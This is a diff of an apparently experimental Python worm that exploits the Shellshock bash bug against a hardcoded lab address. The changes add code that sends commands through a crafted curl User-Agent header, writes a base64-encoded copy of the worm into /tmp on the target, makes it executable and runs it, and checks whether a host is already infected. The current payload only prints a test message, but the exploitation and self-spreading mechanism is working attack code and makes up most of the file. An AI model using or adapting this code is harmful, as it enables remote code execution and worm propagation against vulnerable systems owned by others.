@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 
-import os, sys, subprocess # TODO: use subprocess instead of os (?)
+import os, sys, subprocess
 import base64
 from datetime import datetime
 
 # Test payload information
 payload_name = 'test_payload'
-payload_content = "print('Hello World')"
+payload_content = "print('test_payload successfully executed')"
 
 # Worm tracking information
 def log():
@@ -19,21 +19,24 @@ def log():
 
 # Creates a copy of the payload on host
 def copy_payload():
+	print('run copy')
 	try:
 		f = open(payload_name,'x') # 'x' opens for exclusive creation, failing if the file already exists
 		f.write(payload_content)
 		f.close()
 	except:
 		# This can potentially check if a host has been infected, but the method isn't robust
-		print(f'{payload_name} already exists!')
+		print(f'{payload_name} already exists on this host, so it will not be copied/executed! Worm will now die')
 		sys.exit(0)
 
 # Executes payload on host
 def execute_payload():
+	print('run execute')
 	exec(open(payload_name).read())
 	#os.chmod(payload_name, 0o744) # Changes permissions to: -rwxr--r--
 	log()
 
+"""
 # Rudimentary way to make a LOCAL copy of itself when executed
 def local_replicate():
 	script = sys.argv
@@ -41,13 +44,15 @@ def local_replicate():
 
 	os.mkdir('test')
 	os.system('cp ' + name + ' test')
+"""
 
 # Prototype for shellshock exploit via python
 def exploit():
+	print('run exploit')
 	targets = {'192.168.56.111': '/cgi-bin/shock.sh'} # Hardcoding this for now
 
 	# Test if host has already been wormed: if yes, create test_already_wormed folder and exits
-	if os.path.exists('/tmp/test.sh'):
+	if os.path.exists('/tmp/test_payload'):
 		print('Machine has already been wormed!')
 		os.mkdir('test_already_wormed')
 		sys.exit(0)
@@ -58,22 +63,42 @@ def exploit():
 
 	# Hardcoding this for now, preliminary test for RCE and file creation/execution on vulnerable host
 	cmd_list = []
-	cmd_list.append('echo ZWNobyAnc3VjY2Vzc2Z1bCcgPiAvdG1wL3Rlc3Rfc3VjY2Vzcy50eHQ= > /tmp/test') # echo 'successful' > /tmp/test_success.txt
-	cmd_list.append('base64 -d /tmp/test > /tmp/test.sh')
-	cmd_list.append('chmod 777 /tmp/test.sh')
-	cmd_list.append('/tmp/test.sh') # Successful when test_success.txt file gets created, proving creation and execution of a file on remote host
-	print(cmd_list) # Debug
+	cmd_list.append('echo ZWNobyAnUkNFIHN1Y2Nlc3NmdWwnID4gL3RtcC90ZXN0X1JDRXN1Y2Nlc3MudHh0 > /tmp/testRCE') # echo 'RCE successful' > /tmp/test_RCEsuccess.txt
+	cmd_list.append('base64 -d /tmp/testRCE > /tmp/testRCE.sh')
+	cmd_list.append('chmod 777 /tmp/testRCE.sh')
+	cmd_list.append('/tmp/testRCE.sh') # Successful when test_success.txt file gets created, proving creation and execution of a file on remote host
+
+	# Worm copying itself & executing itself on vulnerable host
+	cmd_list.append(f'echo {encoded} > /tmp/testworm')
+	cmd_list.append('base64 -d /tmp/testworm > /tmp/testworm.py')
+	cmd_list.append('chmod 777 /tmp/testworm.py')
+
+	#cmd_list.append('python3 /tmp/testworm.py') #doesn't work
+	#cmd_list.append('/tmp/testworm.py') #doesn't work
+
+	# Actually executing the worm; cmd_list.append('python3 /tmp/testworm.py') and its variants didn't work...so using a bash script for now
+	# So this still doesn't work... is it because python cannot be executed through a webshell
+	cmd_list.append('echo cHl0aG9uMyAvdG1wL3Rlc3R3b3JtLnB5 > /tmp/testRun') # python3 /tmp/testworm.py
+	cmd_list.append('base64 -d /tmp/testRun > /tmp/testRun.sh')
+	cmd_list.append('chmod 777 /tmp/testRun.sh')
+	cmd_list.append('/tmp/testRun.sh')
+
+#	print(cmd_list) # Debug
 
 	for IP in targets:
 		vulnerable_path = targets[IP]
 		url = f'http://{IP}{vulnerable_path}'
 		print(url) # Debug
 
+# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c '/tmp/testRun.sh'" http://192.168.56.111/cgi-bin/shock.sh
+
 		for cmd in cmd_list:
+			print('run cmd')
 			exploit = 'curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
 			exploit += '\'' + cmd + '\'"'
 			exploit += ' ' + url
-			subprocess.run(exploit, shell=True)
+		#	subprocess.run(exploit, shell=True)
+			os.system(exploit)
 
 def main():
 	# TODO:
@@ -86,11 +111,10 @@ def main():
 	# createpayloadarray()
 	# exploit() # worm exploits shellshock vuln, copies itself over, then executes itself
 
-
-	exploit()
 	copy_payload()
 	execute_payload()
-	local_replicate() # This will not be necessary
+	exploit() # spread
+	# local_replicate() # This will not be necessary
 
 
 	"""
